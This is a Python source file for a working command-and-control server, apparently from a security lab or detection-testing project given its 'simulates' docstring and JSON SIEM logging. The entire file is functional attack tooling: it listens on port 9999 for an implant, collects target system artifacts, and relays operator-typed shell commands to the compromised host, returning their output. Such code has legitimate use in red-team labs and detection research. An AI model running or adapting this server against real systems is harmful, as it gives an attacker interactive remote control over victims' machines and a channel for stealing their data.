import socket
import logging
import sys
import json # Added for structured logging
from datetime import datetime

# --- TELEMETRY SETUP ---
# FIX: Removed basicConfig to prevent global override
# FIX: Define a specific logger for C2
logger = logging.getLogger("C2_SERVER")

def _log_event(event_type, details):
    """
    Helper to structure logs as JSON for SIEM integration.
    """
    log_payload = {
        "event_type": event_type,
        "module": "[c2] C2_SERVER",
        "data": details
    }
    logger.info(json.dumps(log_payload))

# RENAMED FUNCTION BELOW TO MATCH YOUR MAIN CONTROLLER
def start_c2_server(host='0.0.0.0', port=9999):
    """
    Simulates the Command & Control Server (Attacker Side).
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Allow socket reuse to prevent "Address already in use" errors
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((host, port))
        server_socket.listen(1)
        
        msg = f"[*] C2 Server Listening on {host}:{port}..."
        print(msg)
        
        # FIX: Log status as JSON
        _log_event("STATUS", {"msg": "Server Started", "host": host, "port": port})
        
        print("[*] Waiting for implant connection (Run c2_client.py on Target)...")
        conn, addr = server_socket.accept()
        
        print(f"\n[+] CONNECTION ESTABLISHED from {addr[0]}")
        # FIX: Log connection as JSON
        _log_event("SESSION_ESTABLISHED", {"client_ip": addr[0]})

        # 1. Receive Initial Artifacts
        sys_info = conn.recv(4096).decode()
        print(f"\n--- TARGET ARTIFACTS ---\n{sys_info}\n------------------------")
        
        # FIX: Log artifacts as JSON (truncated to avoid huge logs)
        _log_event("ARTIFACTS", {"raw_data": sys_info[:200]}) 

        # 2. Command Loop
        while True:
            try:
                command = input(f"Shell@{addr[0]}> ")
            except EOFError:
                # Input closed (network issue)
                print("\n[*] Input closed. Ending session.")
                break
            
            if command.lower() in ['exit', 'quit']:
                try:
                    conn.send("exit".encode())
                except:
                    pass
                print("[*] Closing session...")
                break
            
            # Empty Enter = check if connection is still alive
            if command.strip() == "":
                try:
                    # Quick ping to test connection
                    conn.send(b"echo")
                    conn.settimeout(2)
                    conn.recv(1024)
                    conn.settimeout(None)
                except:
                    print("\n[!] Connection lost (network may be down)")
                    print("[*] Returning to menu...")
                    break
                continue

            # Send command with error handling
            try:
                conn.send(command.encode())
                _log_event("COMMAND_SENT", {"cmd": command})
            except (OSError, BrokenPipeError, ConnectionResetError) as e:
                print(f"\n[!] Network error: {e}")
                print("[*] Returning to menu...")
                break
            
            # Receive Output
            try:
                output = conn.recv(8192).decode()
                print(output)
            except (OSError, ConnectionResetError) as e:
                print(f"\n[!] Connection lost: {e}")
                print("[*] Returning to menu...")
                break
            except Exception as e:
                print(f"[!] Receive Error: {e}")
                print("[*] Returning to menu...")
                break

    except KeyboardInterrupt:
        print("\n[!] Server stopped by operator.")
    except Exception as e:
        print(f"[!] Critical C2 Error: {e}")
        logger.error(f"C2 Error: {e}")
    finally:
        server_socket.close()
        _log_event("STATUS", {"msg": "Server Stopped"})

if __name__ == "__main__":
    # Standalone testing
    start_c2_server()